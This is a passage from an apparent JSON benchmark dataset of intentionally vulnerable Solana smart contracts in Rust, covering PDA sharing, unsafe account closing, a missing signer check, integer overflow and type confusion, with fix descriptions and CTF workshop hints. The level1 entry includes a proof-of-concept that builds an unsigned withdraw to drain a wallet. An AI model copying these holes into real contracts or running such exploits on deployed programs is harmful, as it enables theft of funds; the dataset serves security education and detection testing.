    "file_content": "use anchor_lang::prelude::*;\nuse anchor_spl::token::{self, Token, TokenAccount};\n\ndeclare_id!(\"Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS\");\n\n#[program]\npub mod pda_sharing_insecure {\n    use super::*;\n\n    pub fn withdraw_tokens(ctx: Context<WithdrawTokens>) -> ProgramResult {\n        let amount = ctx.accounts.vault.amount;\n        let seeds = &[ctx.accounts.pool.mint.as_ref(), &[ctx.accounts.pool.bump]];\n        token::transfer(ctx.accounts.transfer_ctx().with_signer(&[seeds]), amount)\n    }\n}\n\n#[derive(Accounts)]\npub struct WithdrawTokens<'info> {\n    #[account(has_one = vault, has_one = withdraw_destination)]\n    pool: Account<'info, TokenPool>,\n    vault: Account<'info, TokenAccount>,\n    withdraw_destination: Account<'info, TokenAccount>,\n    authority: Signer<'info>,\n    token_program: Program<'info, Token>,\n}\n\nimpl<'info> WithdrawTokens<'info> {\n    pub fn transfer_ctx(&self) -> CpiContext<'_, '_, '_, 'info, token::Transfer<'info>> {\n        let program = self.token_program.to_account_info();\n        let accounts = token::Transfer {\n            from: self.vault.to_account_info(),\n            to: self.withdraw_destination.to_account_info(),\n            authority: self.authority.to_account_info(),\n        };\n        CpiContext::new(program, accounts)\n    }\n}\n\n#[account]\npub struct TokenPool {\n    vault: Pubkey,\n    mint: Pubkey,\n    withdraw_destination: Pubkey,\n    bump: u8,\n}\n",
    "vulnerable_function": "pda_sharing_insecure",
    "vulnerable_lines": [],
    "vulnerability_type": "pda_sharing",
    "category": "8-pda-sharing",
    "severity": "medium",
    "difficulty_tier": 3,
    "description": "Improper PDA seed design allows accounts to be controlled by unintended parties",
    "fix_description": "Use unique seeds per user: &[b\"prefix\", user.key().as_ref(), &[bump]]",
    "references": [
      "https://github.com/coral-xyz/sealevel-attacks"
    ],
    "is_vulnerable": true,
    "has_remediation": true,
    "has_poc": false,
    "context_level": "single_file",
    "original_source_path": "programs/8-pda-sharing/insecure/src/lib.rs",
    "source": "Coral XYZ / Sealevel Attacks"
  },
  {
    "id": "sealevel_9_closing_accounts",
    "source_dataset": "sealevel-attacks",
    "language": "rust",
    "chain": "solana",
    "framework": "anchor",
    "file_name": "9-closing-accounts_insecure.rs",
    "file_content": "use anchor_lang::prelude::*;\n\ndeclare_id!(\"Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS\");\n\n#[program]\npub mod closing_accounts_insecure {\n    use super::*;\n\n    pub fn close(ctx: Context<Close>) -> ProgramResult {\n        let dest_starting_lamports = ctx.accounts.destination.lamports();\n\n        **ctx.accounts.destination.lamports.borrow_mut() = dest_starting_lamports\n            .checked_add(ctx.accounts.account.to_account_info().lamports())\n            .unwrap();\n        **ctx.accounts.account.to_account_info().lamports.borrow_mut() = 0;\n\n        Ok(())\n    }\n}\n\n#[derive(Accounts)]\npub struct Close<'info> {\n    account: Account<'info, Data>,\n    destination: AccountInfo<'info>,\n}\n\n#[account]\npub struct Data {\n    data: u64,\n}\n",
    "vulnerable_function": "closing_accounts_insecure",
    "vulnerable_lines": [],
    "vulnerability_type": "unclosed_accounts",
    "category": "9-closing-accounts",
    "severity": "high",
    "difficulty_tier": 2,
    "description": "Improper account closure leaves accounts open to revival attacks",
    "fix_description": "Zero out data and transfer lamports to recipient, use close constraint in Anchor",
    "references": [
      "https://github.com/coral-xyz/sealevel-attacks"
    ],
    "is_vulnerable": true,
    "has_remediation": true,
    "has_poc": false,
    "context_level": "single_file",
    "original_source_path": "programs/9-closing-accounts/insecure/src/lib.rs",
    "source": "Coral XYZ / Sealevel Attacks"
  },
  {
    "id": "neodyme_level1_missing_signer",
    "source_dataset": "neodyme-workshop",
    "language": "rust",
    "chain": "solana",
    "framework": "anchor",
    "file_name": "level1/src/processor.rs",
    "file_content": "// lib.rs\nuse borsh::{BorshDeserialize, BorshSerialize};\nuse solana_program::{\n    entrypoint,\n    instruction::{AccountMeta, Instruction},\n    pubkey::Pubkey,\n    system_program, sysvar,\n};\n\n#[derive(Debug, BorshDeserialize, BorshSerialize)]\n\npub enum WalletInstruction {\n    /// Initialize a Personal Savings Wallet\n    ///\n    /// Passed accounts:\n    ///\n    /// (1) Wallet account\n    /// (2) authority\n    /// (3) Rent sysvar\n    /// (4) System program\n    Initialize,\n    /// Deposit\n    ///\n    /// Passed accounts:\n    ///\n    /// (1) Wallet account\n    /// (2) Money Source\n    Deposit { amount: u64 },\n    /// Withdraw from Wallet\n    ///\n    /// Passed accounts:\n    ///\n    /// (1) Wallet account\n    /// (2) authority\n    /// (3) Target Wallet account\n    Withdraw { amount: u64 },\n}\n\n#[repr(C)]\n#[derive(Clone, Copy, Debug, Default, PartialEq, BorshSerialize, BorshDeserialize)]\npub struct Wallet {\n    pub authority: Pubkey,\n}\n\npub const WALLET_LEN: u64 = 32;\n\npub mod processor;\nuse processor::process_instruction;\nentrypoint!(process_instruction);\n\npub fn get_wallet_address(authority: Pubkey, wallet_program: Pubkey) -> Pubkey {\n    let (wallet_address, _) =\n        Pubkey::find_program_address(&[&authority.to_bytes()], &wallet_program);\n    wallet_address\n}\n\npub fn initialize(wallet_program: Pubkey, authority_address: Pubkey) -> Instruction {\n    let wallet_address = get_wallet_address(authority_address, wallet_program);\n    Instruction {\n        program_id: wallet_program,\n        accounts: vec![\n            AccountMeta::new(wallet_address, false),\n            AccountMeta::new(authority_address, true),\n            AccountMeta::new_readonly(sysvar::rent::id(), false),\n            AccountMeta::new_readonly(system_program::id(), false),\n        ],\n        data: WalletInstruction::Initialize.try_to_vec().unwrap(),\n    }\n}\n\npub fn deposit(\n    wallet_program: Pubkey,\n    authority_address: Pubkey,\n    source: Pubkey,\n    amount: u64,\n) -> Instruction {\n    let wallet_address = get_wallet_address(authority_address, wallet_program);\n    Instruction {\n        program_id: wallet_program,\n        accounts: vec![\n            AccountMeta::new(wallet_address, false),\n            AccountMeta::new(source, true),\n            AccountMeta::new_readonly(system_program::id(), false),\n        ],\n        data: WalletInstruction::Deposit { amount }.try_to_vec().unwrap(),\n    }\n}\n\npub fn withdraw(\n    wallet_program: Pubkey,\n    authority_address: Pubkey,\n    destination: Pubkey,\n    amount: u64,\n) -> Instruction {\n    let wallet_address = get_wallet_address(authority_address, wallet_program);\n    Instruction {\n        program_id: wallet_program,\n        accounts: vec![\n            AccountMeta::new(wallet_address, false),\n            AccountMeta::new(authority_address, true),\n            AccountMeta::new(destination, false),\n            AccountMeta::new_readonly(system_program::id(), false),\n        ],\n        data: WalletInstruction::Withdraw { amount }.try_to_vec().unwrap(),\n    }\n}\n\n\n// processor.rs\nuse borsh::{BorshDeserialize, BorshSerialize};\nuse solana_program::{\n    account_info::{next_account_info, AccountInfo},\n    entrypoint::ProgramResult,\n    msg,\n    program::{invoke, invoke_signed},\n    program_error::ProgramError,\n    pubkey::Pubkey,\n    rent::Rent,\n    system_instruction,\n    sysvar::Sysvar,\n};\n\nuse crate::{Wallet, WalletInstruction, WALLET_LEN};\n\npub fn process_instruction(\n    program_id: &Pubkey,\n    accounts: &[AccountInfo],\n    mut instruction_data: &[u8],\n) -> ProgramResult {\n    match WalletInstruction::deserialize(&mut instruction_data)? {\n        WalletInstruction::Initialize => initialize(program_id, accounts),\n        WalletInstruction::Deposit { amount } => deposit(program_id, accounts, amount),\n        WalletInstruction::Withdraw { amount } => withdraw(program_id, accounts, amount),\n    }\n}\n\nfn initialize(program_id: &Pubkey, accounts: &[AccountInfo]) -> ProgramResult {\n    msg!(\"init\");\n    let account_info_iter = &mut accounts.iter();\n    let wallet_info = next_account_info(account_info_iter)?;\n    let authority = next_account_info(account_info_iter)?;\n    let rent_info = next_account_info(account_info_iter)?;\n    let (wallet_address, wallet_seed) =\n        Pubkey::find_program_address(&[&authority.key.to_bytes()], program_id);\n    let rent = Rent::from_account_info(rent_info)?;\n\n    assert_eq!(*wallet_info.key, wallet_address);\n    assert!(wallet_info.data_is_empty());\n    assert!(authority.is_signer, \"authority must sign!\");\n\n    invoke_signed(\n        &system_instruction::create_account(\n            &authority.key,\n            &wallet_address,\n            rent.minimum_balance(WALLET_LEN as usize),\n            WALLET_LEN,\n            &program_id,\n        ),\n        &[authority.clone(), wallet_info.clone()],\n        &[&[&authority.key.to_bytes(), &[wallet_seed]]],\n    )?;\n\n    let wallet = Wallet {\n        authority: *authority.key,\n    };\n\n    wallet\n        .serialize(&mut &mut (*wallet_info.data).borrow_mut()[..])\n        .unwrap();\n\n    Ok(())\n}\n\nfn deposit(program_id: &Pubkey, accounts: &[AccountInfo], amount: u64) -> ProgramResult {\n    msg!(\"deposit {}\", amount);\n    let account_info_iter = &mut accounts.iter();\n    let wallet_info = next_account_info(account_info_iter)?;\n    let source_info = next_account_info(account_info_iter)?;\n\n    assert_eq!(wallet_info.owner, program_id);\n\n    invoke(\n        &system_instruction::transfer(&source_info.key, &wallet_info.key, amount),\n        &[wallet_info.clone(), source_info.clone()],\n    )?;\n\n    Ok(())\n}\n\nfn withdraw(program_id: &Pubkey, accounts: &[AccountInfo], amount: u64) -> ProgramResult {\n    msg!(\"withdraw {}\", amount);\n    let account_info_iter = &mut accounts.iter();\n    let wallet_info = next_account_info(account_info_iter)?;\n    let authority_info = next_account_info(account_info_iter)?;\n    let destination_info = next_account_info(account_info_iter)?;\n    let wallet = Wallet::deserialize(&mut &(*wallet_info.data).borrow_mut()[..])?;\n\n    assert_eq!(wallet_info.owner, program_id);\n    assert_eq!(wallet.authority, *authority_info.key);\n\n    if amount > **wallet_info.lamports.borrow_mut() {\n        return Err(ProgramError::InsufficientFunds);\n    }\n\n    **wallet_info.lamports.borrow_mut() -= amount;\n    **destination_info.lamports.borrow_mut() += amount;\n\n    wallet\n        .serialize(&mut &mut (*wallet_info.data).borrow_mut()[..])\n        .unwrap();\n\n    Ok(())\n}\n",
    "vulnerable_function": "withdraw",
    "vulnerable_lines": [
      85,
      90
    ],
    "vulnerability_type": "missing_signer_check",
    "category": "authorization",
    "severity": "critical",
    "difficulty_tier": 2,
    "description": "Missing signer check allows unauthorized users to withdraw funds from any wallet. The withdraw function checks that the authority key matches but does not verify the authority has signed the transaction.",
    "fix_description": "Add is_signer check: assert!(authority_info.is_signer, ErrorCode::Unauthorized). This ensures that only the authority who has signed the transaction can withdraw funds.",
    "poc_code": "use borsh::BorshSerialize;\nuse level1::WalletInstruction;\nuse solana_program::instruction::{AccountMeta, Instruction};\n\nfn hack(env: &mut LocalEnvironment, challenge: &Challenge) {\n    let tx = env.execute_as_transaction(\n        // we construct the instruction manually here\n        // because the level1::withdraw function sets the is_signer flag on the authority\n        // but we don't want to sign \n        &[Instruction {\n            program_id: challenge.wallet_program,\n            accounts: vec![\n                AccountMeta::new(challenge.wallet_address, false),\n                AccountMeta::new(challenge.wallet_authority, false),\n                AccountMeta::new(challenge.hacker.pubkey(), true),\n                AccountMeta::new_readonly(system_program::id(), false),\n            ],\n            data: WalletInstruction::Withdraw { amount: sol_to_lamports(1.0) }.try_to_vec().unwrap(),\n        }],\n        &[&challenge.hacker],\n    );\n    tx.print_named(\"haxx\");\n}",
    "references": [
      "https://workshop.neodyme.io",
      "https://github.com/neodyme-labs/solana-ctf/tree/main/neodyme-breakpoint-workshop/level1"
    ],
    "is_vulnerable": true,
    "has_remediation": true,
    "has_poc": true,
    "context_level": "single_file",
    "original_source_path": "neodyme-breakpoint-workshop/level1/src/",
    "source": "Neodyme / Solana Security Workshop",
    "educational_notes": {
      "challenge_description": "# Level 1 - Personal Vault\n\nLet's get ready to write your first own exploit. \nWe've simplified the contract used in Level 0 a bit - there's no shared vault anymore, the contract only manages personal vaults.\nThe functionality is still the same: after initializing your account, you can deposit and withdraw SOL from this account.\n\nEach personal wallet account has an authority. This authority is stored in the account data struct:\n\n```rust\npub struct Wallet {\n    pub authority: Pubkey\n}\n```\n\nOnly th",
      "bug_hint": "# Bug\n\nThe `withdraw` function does not check that the `authority` has signed. Now, can you exploit this?",
      "has_progressive_hints": true,
      "workshop_level": "level1"
    }
  },
  {
    "id": "neodyme_level2_integer_overflow",
    "source_dataset": "neodyme-workshop",
    "language": "rust",
    "chain": "solana",
    "framework": "anchor",
    "file_name": "level2/src/processor.rs",
    "file_content": "// lib.rs\nuse borsh::{BorshDeserialize, BorshSerialize};\nuse solana_program::{\n    entrypoint,\n    instruction::{AccountMeta, Instruction},\n    pubkey::Pubkey,\n    system_program, sysvar,\n};\n\n#[derive(Debug, BorshDeserialize, BorshSerialize)]\n\npub enum WalletInstruction {\n    /// Initialize a Personal Savings Wallet\n    ///\n    /// Passed accounts:\n    ///\n    /// (1) Wallet account\n    /// (2) authority\n    /// (3) Rent sysvar\n    /// (4) System program\n    Initialize,\n    /// Deposit\n    ///\n    /// Passed accounts:\n    ///\n    /// (1) Wallet account\n    /// (2) Money Source\n    /// (3) System program\n    Deposit { amount: u64 },\n    /// Withdraw from Wallet\n    ///\n    /// Passed accounts:\n    ///\n    /// (1) Wallet account\n    /// (2) authority\n    /// (3) Target Wallet account\n    /// (4) Rent sysvar\n    /// (5) System program\n    Withdraw { amount: u64 },\n}\n\n#[repr(C)]\n#[derive(Clone, Copy, Debug, Default, PartialEq, BorshSerialize, BorshDeserialize)]\npub struct Wallet {\n    pub authority: Pubkey,\n}\n\npub const WALLET_LEN: u64 = 32;\n\npub mod processor;\nuse processor::process_instruction;\nentrypoint!(process_instruction);\n\npub fn get_wallet_address(authority: Pubkey, wallet_program: Pubkey) -> Pubkey {\n    let (wallet_address, _) =\n        Pubkey::find_program_address(&[&authority.to_bytes()], &wallet_program);\n    wallet_address\n}\n\npub fn initialize(wallet_program: Pubkey, authority_address: Pubkey) -> Instruction {\n    let wallet_address = get_wallet_address(authority_address, wallet_program);\n    Instruction {\n        program_id: wallet_program,\n        accounts: vec![\n            AccountMeta::new(wallet_address, false),\n            AccountMeta::new(authority_address, true),\n            AccountMeta::new_readonly(sysvar::rent::id(), false),\n            AccountMeta::new_readonly(system_program::id(), false),\n        ],\n        data: WalletInstruction::Initialize.try_to_vec().unwrap(),\n    }\n}\n\npub fn deposit(\n    wallet_program: Pubkey,\n    authority_address: Pubkey,\n    source: Pubkey,\n    amount: u64,\n) -> Instruction {\n    let wallet_address = get_wallet_address(authority_address, wallet_program);\n    Instruction {\n        program_id: wallet_program,\n        accounts: vec![\n            AccountMeta::new(wallet_address, false),\n            AccountMeta::new(source, true),\n            AccountMeta::new_readonly(system_program::id(), false),\n        ],\n        data: WalletInstruction::Deposit { amount }.try_to_vec().unwrap(),\n    }\n}\n\npub fn withdraw(\n    wallet_program: Pubkey,\n    authority_address: Pubkey,\n    destination: Pubkey,\n    amount: u64,\n) -> Instruction {\n    let wallet_address = get_wallet_address(authority_address, wallet_program);\n    Instruction {\n        program_id: wallet_program,\n        accounts: vec![\n            AccountMeta::new(wallet_address, false),\n            AccountMeta::new(authority_address, true),\n            AccountMeta::new(destination, false),\n            AccountMeta::new_readonly(sysvar::rent::id(), false),\n            AccountMeta::new_readonly(system_program::id(), false),\n        ],\n        data: WalletInstruction::Withdraw { amount }.try_to_vec().unwrap(),\n    }\n}\n\n\n// processor.rs\nuse borsh::{BorshDeserialize, BorshSerialize};\nuse solana_program::{\n    account_info::{next_account_info, AccountInfo},\n    entrypoint::ProgramResult,\n    msg,\n    program::{invoke, invoke_signed},\n    program_error::ProgramError,\n    pubkey::Pubkey,\n    rent::Rent,\n    system_instruction,\n    sysvar::Sysvar,\n};\n\nuse crate::{Wallet, WalletInstruction, WALLET_LEN};\n\npub fn process_instruction(\n    program_id: &Pubkey,\n    accounts: &[AccountInfo],\n    mut instruction_data: &[u8],\n) -> ProgramResult {\n    match WalletInstruction::deserialize(&mut instruction_data)? {\n        WalletInstruction::Initialize => initialize(program_id, accounts),\n        WalletInstruction::Deposit { amount } => deposit(program_id, accounts, amount),\n        WalletInstruction::Withdraw { amount } => withdraw(program_id, accounts, amount),\n    }\n}\n\nfn initialize(program_id: &Pubkey, accounts: &[AccountInfo]) -> ProgramResult {\n    msg!(\"init\");\n    let account_info_iter = &mut accounts.iter();\n    let wallet_info = next_account_info(account_info_iter)?;\n    let authority = next_account_info(account_info_iter)?;\n    let rent_info = next_account_info(account_info_iter)?;\n    let (wallet_address, wallet_seed) =\n        Pubkey::find_program_address(&[&authority.key.to_bytes()], program_id);\n    let rent = Rent::from_account_info(rent_info)?;\n\n    assert_eq!(*wallet_info.key, wallet_address);\n    assert!(wallet_info.data_is_empty());\n    assert!(authority.is_signer, \"authority must sign!\");\n\n    invoke_signed(\n        &system_instruction::create_account(\n            &authority.key,\n            &wallet_address,\n            rent.minimum_balance(WALLET_LEN as usize),\n            WALLET_LEN,\n            &program_id,\n        ),\n        &[authority.clone(), wallet_info.clone()],\n        &[&[&authority.key.to_bytes(), &[wallet_seed]]],\n    )?;\n\n    let wallet = Wallet {\n        authority: *authority.key,\n    };\n\n    wallet\n        .serialize(&mut &mut (*wallet_info.data).borrow_mut()[..])\n        .unwrap();\n\n    Ok(())\n}\n\nfn deposit(program_id: &Pubkey, accounts: &[AccountInfo], amount: u64) -> ProgramResult {\n    msg!(\"deposit {}\", amount);\n    let account_info_iter = &mut accounts.iter();\n    let wallet_info = next_account_info(account_info_iter)?;\n    let source_info = next_account_info(account_info_iter)?;\n\n    assert_eq!(wallet_info.owner, program_id);\n\n    invoke(\n        &system_instruction::transfer(&source_info.key, &wallet_info.key, amount),\n        &[wallet_info.clone(), source_info.clone()],\n    )?;\n\n    Ok(())\n}\n\nfn withdraw(program_id: &Pubkey, accounts: &[AccountInfo], amount: u64) -> ProgramResult {\n    msg!(\"withdraw {}\", amount);\n    let account_info_iter = &mut accounts.iter();\n    let wallet_info = next_account_info(account_info_iter)?;\n    let authority_info = next_account_info(account_info_iter)?;\n    let destination_info = next_account_info(account_info_iter)?;\n    let rent_info = next_account_info(account_info_iter)?;\n\n    let wallet = Wallet::deserialize(&mut &(*wallet_info.data).borrow_mut()[..])?;\n    let rent = Rent::from_account_info(rent_info)?;\n\n    assert_eq!(wallet_info.owner, program_id);\n    assert_eq!(wallet.authority, *authority_info.key);\n    assert!(authority_info.is_signer, \"authority must sign!\");\n\n    let min_balance = rent.minimum_balance(WALLET_LEN as usize);\n    if min_balance + amount > **wallet_info.lamports.borrow_mut() {\n        return Err(ProgramError::InsufficientFunds);\n    }\n\n    **wallet_info.lamports.borrow_mut() -= amount;\n    **destination_info.lamports.borrow_mut() += amount;\n\n    wallet\n        .serialize(&mut &mut (*wallet_info.data).borrow_mut()[..])\n        .unwrap();\n\n    Ok(())\n}\n",
    "vulnerable_function": "withdraw",
    "vulnerable_lines": [
      96,
      97
    ],
    "vulnerability_type": "arithmetic_overflow",
    "category": "arithmetic",
    "severity": "high",
    "difficulty_tier": 2,
    "description": "Integer overflow/underflow in withdraw function when updating lamport balances. The operation `**wallet_info.lamports.borrow_mut() -= amount` can underflow for large amounts, and `**destination_info.lamports.borrow_mut() += amount` can overflow.",
    "fix_description": "Use checked arithmetic operations: checked_sub() and checked_add() instead of direct subtraction and addition. Return error on overflow/underflow.",
    "poc_code": "    **wallet_info.lamports.borrow_mut() -= amount;\n    **destination_info.lamports.borrow_mut() += amount;",
    "references": [
      "https://workshop.neodyme.io",
      "https://github.com/neodyme-labs/solana-ctf/tree/main/neodyme-breakpoint-workshop/level2"
    ],
    "is_vulnerable": true,
    "has_remediation": true,
    "has_poc": true,
    "context_level": "single_file",
    "original_source_path": "neodyme-breakpoint-workshop/level2/src/",
    "source": "Neodyme / Solana Security Workshop",
    "educational_notes": {
      "challenge_description": "# Level 2 - Secure Personal Vault\n\nNow that this missing signer check is fixed, the contract looks really secure... but I wonder, if you can still break it?",
      "bug_hint": "# Bug\n\nThe bug is in the `withdraw` function:\n```rs\n   **wallet_info.lamports.borrow_mut() -= amount;\n   **destination_info.lamports.borrow_mut() += amount;\n```\n\ncan overflow/underflow for large `amount`",
      "has_progressive_hints": true,
      "workshop_level": "level2"
    }
  },
  {
    "id": "neodyme_level3_type_confusion",
    "source_dataset": "neodyme-workshop",
    "language": "rust",
    "chain": "solana",
    "framework": "anchor",
    "file_name": "level3/src/processor.rs",
    "file_content": "// lib.rs\nuse borsh::{BorshDeserialize, BorshSerialize};\nuse solana_program::{\n    entrypoint,\n    instruction::{AccountMeta, Instruction},\n    pubkey::Pubkey,\n    system_program, sysvar,\n};\n\n#[derive(Debug, BorshDeserialize, BorshSerialize)]\npub enum TipInstruction {\n    /// Initialize a vault\n    ///\n    /// Passed accounts:\n    ///\n    /// (1) Vault account\n    /// (2) initializer (must sign)\n    /// (3) Rent sysvar\n    /// (4) System Program\n    Initialize {\n        seed: u8,\n        fee: f64,\n        fee_recipient: Pubkey,\n    },\n    /// Initialize a TipPool\n    ///\n    /// Passed accounts:\n    ///\n    /// (1) Vault account\n    /// (2) withdraw_authority (must sign)\n    /// (3) Pool account\n    CreatePool,\n    /// Tip\n    ///\n    /// Passed accounts:\n    ///\n    /// (1) Vault account\n    /// (2) Pool\n    /// (3) Tip Source\n    /// (4) System program\n    Tip { amount: u64 },\n    /// Withdraw from Pool\n    ///\n    /// Passed accounts:\n    ///\n    /// (1) Vault account\n    /// (2) Pool account\n    /// (3) withdraw_authority (must sign)\n    Withdraw { amount: u64 },\n}\n\n#[repr(C)]\n#[derive(Clone, Copy, Debug, Default, PartialEq, BorshSerialize, BorshDeserialize)]\npub struct TipPool {\n    pub withdraw_authority: Pubkey,\n    pub value: u64,\n    pub vault: Pubkey,\n}\n\npub const TIP_POOL_LEN: u64 = 32 + 8 + 32;\n\n#[repr(C)]\n#[derive(Clone, Copy, Debug, Default, PartialEq, BorshSerialize, BorshDeserialize)]\npub struct Vault {\n    pub creator: Pubkey,\n    pub fee: f64,              //reserved for future use\n    pub fee_recipient: Pubkey, //reserved for future use\n    pub seed: u8,\n}\npub const VAULT_LEN: u64 = 32 + 8 + 32 + 1;\n\npub mod processor;\nuse processor::process_instruction;\nentrypoint!(process_instruction);\n\npub fn initialize(\n    tip_program: Pubkey,\n    vault_address: Pubkey,\n    initializer_address: Pubkey,\n    seed: u8,\n    fee: f64,\n    fee_recipient: Pubkey,\n) -> Instruction {\n    Instruction {\n        program_id: tip_program,\n        accounts: vec![\n            AccountMeta::new(vault_address, false),\n            AccountMeta::new(initializer_address, true),\n            AccountMeta::new_readonly(sysvar::rent::id(), false),\n            AccountMeta::new_readonly(system_program::id(), false),\n        ],\n        data: TipInstruction::Initialize {\n            seed,\n            fee,\n            fee_recipient,\n        }\n        .try_to_vec()\n        .unwrap(),\n    }\n}\n\npub fn create_pool(\n    tip_program: Pubkey,\n    vault_address: Pubkey,\n    withdraw_authority: Pubkey,\n    pool_address: Pubkey,\n) -> Instruction {\n    Instruction {\n        program_id: tip_program,\n        accounts: vec![\n            AccountMeta::new(vault_address, false),\n            AccountMeta::new_readonly(withdraw_authority, true),\n            AccountMeta::new(pool_address, false),\n        ],\n        data: TipInstruction::CreatePool.try_to_vec().unwrap(),\n    }\n}\n\npub fn tip(\n    tip_program: Pubkey,\n    vault_address: Pubkey,\n    pool_address: Pubkey,\n    source: Pubkey,\n    amount: u64,\n) -> Instruction {\n    Instruction {\n        program_id: tip_program,\n        accounts: vec![\n            AccountMeta::new(vault_address, false),\n            AccountMeta::new(pool_address, false),\n            AccountMeta::new(source, true),\n            AccountMeta::new_readonly(system_program::id(), false),\n        ],\n        data: TipInstruction::Tip { amount }.try_to_vec().unwrap(),\n    }\n}\n\npub fn withdraw(\n    tip_program: Pubkey,\n    vault_address: Pubkey,\n    pool_address: Pubkey,\n    withdraw_authority: Pubkey,\n    amount: u64,\n) -> Instruction {\n    Instruction {\n        program_id: tip_program,\n        accounts: vec![\n            AccountMeta::new(vault_address, false),\n            AccountMeta::new(pool_address, false),\n            AccountMeta::new(withdraw_authority, true),\n            AccountMeta::new_readonly(system_program::id(), false),\n        ],\n        data: TipInstruction::Withdraw { amount }.try_to_vec().unwrap(),\n    }\n}\n\n\n// processor.rs\nuse borsh::{BorshDeserialize, BorshSerialize};\nuse solana_program::{\n    account_info::{next_account_info, AccountInfo},\n    entrypoint::ProgramResult,\n    program::{invoke, invoke_signed},\n    program_error::ProgramError,\n    pubkey::Pubkey,\n    rent::Rent,\n    system_instruction,\n    sysvar::Sysvar,\n};\n\nuse crate::{TipInstruction, TipPool, Vault, VAULT_LEN};\n\npub fn process_instruction(\n    program_id: &Pubkey,\n    accounts: &[AccountInfo],\n    mut instruction_data: &[u8],\n) -> ProgramResult {\n    match TipInstruction::deserialize(&mut instruction_data)? {\n        TipInstruction::Initialize {\n            seed,\n            fee,\n            fee_recipient,\n        } => initialize(program_id, accounts, seed, fee, fee_recipient),\n        TipInstruction::Tip { amount } => tip(program_id, accounts, amount),\n        TipInstruction::Withdraw { amount } => withdraw(program_id, accounts, amount),\n        TipInstruction::CreatePool => create_pool(program_id, accounts),\n    }\n}\n\nfn initialize(\n    program_id: &Pubkey,\n    accounts: &[AccountInfo],\n    seed: u8,\n    fee: f64,\n    fee_recipient: Pubkey,\n) -> ProgramResult {\n    let account_info_iter = &mut accounts.iter();\n    let vault_info = next_account_info(account_info_iter)?;\n    let initializer_info = next_account_info(account_info_iter)?;\n    let rent_info = next_account_info(account_info_iter)?;\n    let rent = Rent::from_account_info(rent_info)?;\n    let vault_address = Pubkey::create_program_address(&[&[seed]], program_id).unwrap();\n\n    assert_eq!(*vault_info.key, vault_address);\n    assert!(\n        vault_info.data_is_empty(),\n        \"vault info must be empty account!\"\n    );\n    assert!(initializer_info.is_signer, \"initializer must sign!\");\n\n    invoke_signed(\n        &system_instruction::create_account(\n            &initializer_info.key,\n            &vault_address,\n            rent.minimum_balance(VAULT_LEN as usize),\n            VAULT_LEN,\n            &program_id,\n        ),\n        &[initializer_info.clone(), vault_info.clone()],\n        &[&[&[seed]]],\n    )?;\n\n    let vault = Vault {\n        creator: *initializer_info.key,\n        fee,\n        fee_recipient,\n        seed,\n    };\n\n    vault\n        .serialize(&mut &mut vault_info.data.borrow_mut()[..])\n        .unwrap();\n\n    Ok(())\n}\n\nfn create_pool(program_id: &Pubkey, accounts: &[AccountInfo]) -> ProgramResult {\n    let account_info_iter = &mut accounts.iter();\n    let vault_info = next_account_info(account_info_iter)?;\n    let withdraw_authority_info = next_account_info(account_info_iter)?;\n    let pool_info = next_account_info(account_info_iter)?;\n\n    assert_eq!(vault_info.owner, program_id);\n    assert!(\n        withdraw_authority_info.is_signer,\n        \"withdraw authority must sign!\"\n    );\n    assert_eq!(pool_info.owner, program_id);\n    // check that account is uninitialized\n    if pool_info.data.borrow_mut().into_iter().any(|b| *b != 0) {\n        return Err(ProgramError::AccountAlreadyInitialized);\n    }\n\n    let pool = TipPool {\n        withdraw_authority: *withdraw_authority_info.key,\n        value: 0,\n        vault: *vault_info.key,\n    };\n\n    pool.serialize(&mut &mut pool_info.data.borrow_mut()[..])\n        .unwrap();\n\n    Ok(())\n}\n\nfn tip(program_id: &Pubkey, accounts: &[AccountInfo], amount: u64) -> ProgramResult {\n    let account_info_iter = &mut accounts.iter();\n    let vault_info = next_account_info(account_info_iter)?;\n    let pool_info = next_account_info(account_info_iter)?;\n    let source_info = next_account_info(account_info_iter)?;\n    let mut pool = TipPool::deserialize(&mut &(*pool_info.data).borrow_mut()[..])?;\n\n    assert_eq!(vault_info.owner, program_id);\n    assert_eq!(pool_info.owner, program_id);\n    assert_eq!(pool.vault, *vault_info.key);\n\n    invoke(\n        &system_instruction::transfer(&source_info.key, &vault_info.key, amount),\n        &[vault_info.clone(), source_info.clone()],\n    )?;\n\n    pool.value = match pool.value.checked_add(amount) {\n        Some(v) => v,\n        None => return Err(ProgramError::InvalidArgument),\n    };\n\n    pool.serialize(&mut &mut pool_info.data.borrow_mut()[..])\n        .unwrap();\n\n    Ok(())\n}\n\nfn withdraw(program_id: &Pubkey, accounts: &[AccountInfo], amount: u64) -> ProgramResult {\n    let account_info_iter = &mut accounts.iter();\n    let vault_info = next_account_info(account_info_iter)?;\n    let pool_info = next_account_info(account_info_iter)?;\n    let withdraw_authority_info = next_account_info(account_info_iter)?;\n    let mut pool = TipPool::deserialize(&mut &(*pool_info.data).borrow_mut()[..])?;\n\n    assert_eq!(vault_info.owner, program_id);\n    assert_eq!(pool_info.owner, program_id);\n    assert!(\n        withdraw_authority_info.is_signer,\n        \"withdraw authority must sign\"\n    );\n    assert_eq!(pool.vault, *vault_info.key);\n    assert_eq!(*withdraw_authority_info.key, pool.withdraw_authority);\n\n    pool.value = match pool.value.checked_sub(amount) {\n        Some(v) => v,\n        None => return Err(ProgramError::InvalidArgument),\n    };\n\n    **(*vault_info).lamports.borrow_mut() -= amount;\n    **(*withdraw_authority_info).lamports.borrow_mut() += amount;\n\n    pool.serialize(&mut &mut pool_info.data.borrow_mut()[..])\n        .unwrap();\n\n    Ok(())\n}\n",
    "vulnerable_function": "withdraw",
    "vulnerable_lines": [
      85,
      90
    ],
    "vulnerability_type": "type_cosplay",
    "category": "account_validation",
    "severity": "critical",
    "difficulty_tier": 3,
    "description": "Type confusion vulnerability where a Vault struct can be deserialized as a TipPool struct. Only the account owner is checked in withdraw function, not the account type discriminator, allowing an attacker to withdraw from the global vault by passing it as their tip pool.",
    "fix_description": "Add proper type discriminators and validate account types. Check the account discriminator before deserializing. Use Anchor's account type checking to prevent type confusion attacks.",
    "poc_code": "pub struct TipPool {\n    pub withdraw_authority: Pubkey, // at the same position as Vault::creator\n    pub value: u64,                 // at the same position as Vault::fee\n    pub vault: Pubkey,              // at the same position as Vault::fee_recipient\n}\n\npub struct Vault {\n    pub creator: Pubkey,\n    pub fee: f64,              \n    pub fee_recipient: Pubkey,\n    pub seed: u8,\n}",
    "references": [
      "https://workshop.neodyme.io",
